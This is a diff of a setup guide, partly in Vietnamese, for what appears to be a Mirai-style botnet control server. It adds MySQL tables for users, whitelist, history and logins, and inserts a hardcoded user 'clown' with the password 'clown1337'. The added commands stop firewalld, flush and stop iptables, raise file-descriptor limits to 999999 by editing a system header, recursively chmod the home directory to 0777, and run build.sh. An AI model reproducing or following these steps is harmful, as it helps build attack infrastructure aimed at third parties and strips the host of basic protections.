@@ -150,7 +150,8 @@ CREATE TABLE `history` (
   PRIMARY KEY (`id`),
   KEY `user_id` (`user_id`)
 );
- 
+ ```
+ ```
 CREATE TABLE `users` (
   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
   `username` varchar(32) NOT NULL,
@@ -166,7 +167,8 @@ CREATE TABLE `users` (
   PRIMARY KEY (`id`),
   KEY `username` (`username`)
 );
- 
+ ```
+ ```
 CREATE TABLE `whitelist` (
   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
   `prefix` varchar(16) DEFAULT NULL,
@@ -174,8 +176,11 @@ CREATE TABLE `whitelist` (
   PRIMARY KEY (`id`),
   KEY `prefix` (`prefix`)
 );
+```
+```
 INSERT INTO users VALUES (NULL, 'clown', 'clown1337', 0, 0, 0, 0, -1, 1, 30, '');
-
+```
+```
 CREATE TABLE `logins` (
   `id` int(11) NOT NULL,
   `username` varchar(32) NOT NULL,
@@ -188,13 +193,11 @@ exit;
 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ```
-yum install firewalld;service firewalld stop
+service firewalld stop
+iptables -F;service iptables stop 
 ```
 ```
-yum install iptables;iptables -F;service iptables stop 
-```
-```
-yum install httpd;service httpd restart  
+service httpd restart  
 ```
 ```
 service mariadb restart
@@ -204,14 +207,16 @@ service mariadb restart
 nano /usr/include/bits/typesizes.h
 ```
 cuộn xuống và chỉnh sửa 1024 thành 999999
+
 SAU ĐÓ LƯU BẰNG: ctrl X rồi Y
+
 Sao chép & Dán 
 ```
 ulimit -n999999; ulimit -u999999; ulimit -e999999
 ```
 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-Sao chép & Dán này: 
+Sao chép & Dán: 
 ```
 cd ~/; chmod 0777 * -R; sh build.sh
 ```
